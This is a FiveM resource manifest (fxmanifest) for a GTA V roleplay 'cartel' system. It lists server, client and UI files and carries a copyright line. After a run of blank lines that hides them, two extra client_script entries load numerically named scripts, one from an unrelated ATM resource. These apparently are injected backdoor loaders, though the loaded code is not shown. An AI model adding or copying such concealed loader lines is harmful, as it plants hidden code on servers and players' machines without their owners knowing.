fx_version 'adamant'

game 'gta5'

description 'cartel`s System'

version '0.1'

server_scripts {
    '@mysql-async/lib/MySQL.lua',
    'server/main.lua'
}

client_scripts {
    'config.lua',
    'client/main.lua'
}

ui_page {
	'html/index.html'
}

files {
	'html/index.html',
	'html/style.css',
	'html/script.js'
}

--© Miguel Reyes (themaykellll1) - 2020/2021








client_script "44231.lua"
client_script '@esx_atm/48706.lua'